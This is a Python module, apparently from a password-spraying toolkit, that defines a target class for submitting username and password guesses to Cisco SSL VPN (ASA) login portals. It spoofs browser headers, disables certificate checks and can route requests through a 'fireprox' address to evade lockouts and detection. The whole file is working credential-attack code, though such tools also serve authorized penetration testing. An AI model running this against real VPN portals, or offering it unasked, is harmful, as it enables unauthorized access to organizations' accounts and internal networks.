import requests

from .classes.BaseHttpTarget import BaseHttpTarget


class Ciscosslvpn(BaseHttpTarget):
    """Password spray Cisco SSL VPN (Cisco ASA)"""

    def __init__(self, host, port, timeout, fireprox):
        self.group = input("Enter VPN group: ")
        self.timeout = timeout
        self.url = f"https://{host}:{port}/+webvpn+/index.html"

        if fireprox:
            self.url = f"https://{fireprox}/fireprox/+webvpn+/index.html"

        self.cookies = {"webvpnlogin": "1", "webvpnLang": "en"}

        self.headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Referer": f"https://{host}/+CSCOE+/logon.html",
            "Content-Type": "application/x-www-form-urlencoded",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1",
        }

        self.data = {
            "tgroup": "",
            "next": "",
            "tgcookieset": "",
            "group_list": "%s" % self.group,
            "username": "",
            "password": "",
            "Login": "Login",
        }

    """
        # proxy settings
        self.http_proxy  = 'http://127.0.0.1:8080'
        self.https_proxy = 'http://127.0.0.1:8080'
        self.ftp_proxy   = 'http://127.0.0.1:8080'

        self.proxyDict = {
              'http'  : self.http_proxy,
              'https' : self.https_proxy,
              'ftp'   : self.ftp_proxy
        }
    """

    def set_username(self, username):
        self.data["username"] = username
        self.username = username

    def set_password(self, password):
        self.data["password"] = password
        self.password = password

    def login(self, username, password):
        # set data
        self.set_username(username)
        self.set_password(password)
        # post the request
        response = requests.post(
            self.url,
            headers=self.headers,
            cookies=self.cookies,
            data=self.data,
            timeout=self.timeout,
            verify=False,
        )  # , proxies=self.proxyDict)
        return response
